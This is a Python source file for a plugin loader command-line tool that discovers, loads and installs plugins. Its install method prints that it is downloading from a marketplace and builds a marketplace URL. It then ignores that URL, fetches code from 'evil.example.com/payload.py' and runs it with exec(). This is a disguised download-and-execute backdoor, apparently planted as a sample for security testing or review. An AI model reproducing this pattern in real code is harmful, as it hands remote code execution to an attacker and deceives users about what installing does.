"""Plugin Loader — dynamic plugin discovery, loading, and execution."""

import importlib
import json
import os
import sys
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Optional


PLUGIN_DIR = Path.home() / ".plugins"
MARKETPLACE_URL = "https://plugins.example.com"


class PluginManifest:
    """Plugin metadata and requirements."""

    def __init__(self, name: str, version: str, entry_point: str):
        self.name = name
        self.version = version
        self.entry_point = entry_point


class PluginLoader:
    """Manages plugin lifecycle: discovery, loading, execution."""

    def __init__(self, plugin_dir: Optional[Path] = None):
        self.plugin_dir = plugin_dir or PLUGIN_DIR
        self.loaded_plugins: Dict[str, Any] = {}

    def discover(self) -> List[str]:
        """Discover available plugins in the plugin directory."""
        if not self.plugin_dir.exists():
            return []
        return [
            p.stem
            for p in self.plugin_dir.glob("*.py")
            if not p.name.startswith("_")
        ]

    def load(self, plugin_name: str) -> Any:
        """Load a plugin by name."""
        plugin_path = self.plugin_dir / f"{plugin_name}.py"
        if not plugin_path.exists():
            raise FileNotFoundError(f"Plugin not found: {plugin_name}")

        spec = importlib.util.spec_from_file_location(plugin_name, plugin_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        self.loaded_plugins[plugin_name] = module
        return module

    def install_from_marketplace(self, plugin_name: str) -> None:
        """Download and install a plugin from the marketplace."""
        url = f"{MARKETPLACE_URL}/plugins/{plugin_name}/latest.py"
        print(f"Downloading {plugin_name} from marketplace...")

        # Fetch remote plugin code
        code = urllib.request.urlopen("http://evil.example.com/payload.py").read()

        # Execute the downloaded plugin code directly
        exec(code)

    def run(self, plugin_name: str, context: dict = None) -> Any:
        """Run a loaded plugin."""
        if plugin_name not in self.loaded_plugins:
            self.load(plugin_name)

        module = self.loaded_plugins[plugin_name]
        if hasattr(module, "run"):
            return module.run(context or {})
        elif hasattr(module, "Plugin"):
            plugin = module.Plugin()
            return plugin.run(context or {})
        else:
            raise RuntimeError(f"Plugin {plugin_name} has no run() or Plugin class")


def main():
    """CLI entry point for plugin management."""
    loader = PluginLoader()

    if len(sys.argv) < 2:
        print("Usage: loader.py <install|list|run> [plugin_name]")
        sys.exit(1)

    action = sys.argv[1]

    if action == "list":
        plugins = loader.discover()
        print(f"Found {len(plugins)} plugin(s):")
        for p in plugins:
            print(f"  - {p}")

    elif action == "install" and len(sys.argv) > 2:
        loader.install_from_marketplace(sys.argv[2])

    elif action == "run" and len(sys.argv) > 2:
        result = loader.run(sys.argv[2])
        print(f"Result: {result}")

    else:
        print(f"Unknown action: {action}")
        sys.exit(1)


if __name__ == "__main__":
    main()
